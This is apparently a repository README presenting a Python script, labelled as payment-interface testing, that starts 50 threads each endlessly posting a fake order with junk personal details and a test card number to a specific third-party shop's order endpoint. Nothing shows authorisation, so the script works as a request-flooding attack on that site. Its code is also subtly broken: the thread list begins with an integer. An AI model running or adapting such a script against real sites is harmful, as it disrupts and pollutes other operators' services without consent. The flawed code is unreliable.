# Payment-Interfaces
Testing scripts for pay interfaces.

```python
import requests
import threading

url = 'http://luckypro12.com/PS5/includes/submit_order_limelight.php'

data = {
    'limelight_charset': 'utf8',
    'action': 'submitorder',
    'campaign_id': '6',
    'custom_product': '9',
    'product_qty': '1',
    'sub1': '',
    'prepaid_campaign_id': '4',
    'prepaid_custom_product': '9',
    'shipping': '0',
    'billingSameAsShipping': 'YES',
    'country': 'US',
    'billing_country': 'US',
    'orderid': 'A58C9E46EE',
    'AFFID': '',
    'C1': '',
    'C2': '',
    'C3': '',
    'TRANSID': '',
    'sub3': '',
    'userid': '136687',
    'I': 'on',
    'fields_fname': 'kjh',
    'fields_lname': 'kjh',
    'fields_email': 'kjhdfg@skjfg.com',
    'fields_phone': '1231231231',
    'fields_address1': '123',
    'fields_city': '123',
    'fields_state': 'AL',
    'fields_zip': '12312',
    'billingcheck': 'yes',
    'billing_fname': '',
    'billing_lname': '',
    'billing_street_address': '',
    'billing_city': '',
    'billing_state': 'AL',
    'billing_postcode': '',
    'cc_number': '4007000000027',
    'cc_expmonth': '08',
    'cc_expyear': '21',
    'cc_cvv': '234'
}

def do_request():
    while True:
        response = requests.post(url, data=data).text
        print(response)

threads = [50]

for i in range(50):
    t = threading.Thread(target=do_request)
    t.daemon = True
    threads.append(t)

for i in range(50):
    threads[i].start()

for i in range(50):
    threads[i].join()
```
